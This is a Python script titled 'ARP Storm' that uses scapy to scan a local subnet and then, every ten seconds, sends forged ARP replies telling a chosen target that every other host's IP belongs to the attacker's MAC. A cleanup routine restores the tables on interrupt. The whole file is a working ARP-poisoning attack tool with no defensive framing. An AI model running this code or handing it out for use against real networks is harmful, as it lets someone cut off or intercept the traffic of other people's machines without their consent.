from scapy.all import Ether, ARP, sendp, get_if_hwaddr, srp, conf, get_if_addr
import time
import sys
import argparse
import random

def rand_mac():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
        )
    
def scan():
    ip="192.168.1.0/24"
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    devices={}
    for element in answered_list:
        devices[element[1].psrc]=  element[1].hwsrc
    current_ip = get_if_addr(conf.iface)
    devices[current_ip] = get_if_hwaddr(conf.iface)
    return devices

def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=2, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    else:
        print(f"[!] Failed to get MAC for {ip}")
        return None

def spoof(from_mac, from_ip,to_ip,interface, devices):
    to_mac = get_mac(to_ip)
    
    packet = Ether(dst=to_mac, src=from_mac) / \
             ARP(op=2, pdst=to_ip, hwdst=to_mac, psrc=from_ip)
    sendp(packet, iface=interface, verbose=0)
    print(f"[*] Sent to {to_ip}={to_mac} from {from_ip}-{from_mac}")
    return

def restore(ip, iface, devices):
    for from_ip in devices.keys():
        from_mac = devices[from_ip]
        to_mac = get_mac(ip)
        packet = Ether(dst=to_mac, src=from_mac) / \
                 ARP(op=2, pdst=ip, hwdst=to_mac, psrc=from_ip, hwsrc=from_mac)
        sendp(packet, count=4, iface=iface, verbose=0)
        print(f"[*] Restored {ip}={to_mac} from {from_ip}-{from_mac}")
    return

def start_attack(to_ip, iface, multi,devices):
    mac= rand_mac()
    mac=devices[get_if_addr(iface)]
    if multi:
        for from_ip in devices.keys():
            spoof(mac, from_ip, to_ip, iface, devices)
    else:
        #spoof(devices[ip], ip, iface)
        pass
    return

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description='ARP Storm')
    parser.add_argument('target', help='IP of target')
    parser.add_argument('-i', '--interface', default='eth0',
                       help='Network interface (default: eth0)')
    #parser.add_argument('-m', '--multi', default=True,
    #                   help='Enable multi-MAC ARP storm')
    
    args = parser.parse_args()
    
    ip = args.target
    iface = args.interface
    #storm = args.multi
    storm = True
    
    try:
        print(f"[*] Starting ARP attack om {args.target}")
        devices = scan()
        #debugging
        print(f"[*] Devices found: {devices}")
        if ip in devices: del devices[ip]
        else: 
            print(f"[*] Target {ip} not found in network")
            sys.exit(0)
        #debigging
        
        print(f"[*] Scan Complete -debug- {args.target}")
        while True:
            start_attack(ip, iface, storm,devices)
            time.sleep(10)
            
    except KeyboardInterrupt:
        print("\n[*] Restoring ARP tables")
        restore(ip, iface,devices)
        sys.exit(0)
        
